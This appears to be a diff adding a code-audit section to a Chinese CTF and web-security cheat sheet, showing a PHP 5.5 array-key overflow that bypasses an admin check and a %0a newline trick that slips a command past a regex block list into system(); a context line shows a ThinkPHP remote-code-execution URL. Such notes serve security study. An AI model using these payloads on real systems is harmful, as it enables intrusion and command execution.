@@ -531,6 +531,37 @@ index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]
 |      Warning       |                    警告实体可能存在的问题                    |          Warning: 199 Miscellaneous warning           |
 |  WWW-Authenticate  |             表明客户端请求实体应该使用的授权方案             |                WWW-Authenticate: Basic                |
 
+## 代码审计
+
+### Key溢出（PHP5.5）
+
+漏洞存在php5.5，当数值溢出的时候就会覆盖0键值，没有定义的话就创建。
+
+32位系统：-2^31  --  2^31
+
+64位系统：-2^63  --  2^63
+
+```php
+//payload=stuff[4294967296]=admin&stuff[1]=user
+$stuff = $_POST["stuff"];
+$array = ['admin', 'user'];
+if($stuff === $array && $stuff[0] != 'admin') { 
+}
+```
+
+### %0a（换行绕过正则表达式）
+
+```php
+// ls -i 查看索引节点
+//payload: num=123%0atac `find /  -inum 30415432 ` 
+if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){
+     echo "my favorite num is:";
+     system("echo ".$num);
+     }else{
+     echo 'Bonjour!';
+ } 
+```
+
 # Python
 
 ## .pyc
